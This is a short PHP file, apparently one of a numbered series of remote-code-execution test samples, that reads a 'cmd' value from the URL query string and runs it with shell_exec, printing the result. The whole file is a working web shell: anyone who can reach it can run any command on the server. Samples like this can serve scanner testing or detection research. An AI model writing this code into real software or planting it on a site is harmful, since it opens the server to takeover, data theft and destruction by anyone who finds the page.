<?php
// RCE test variation #481
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>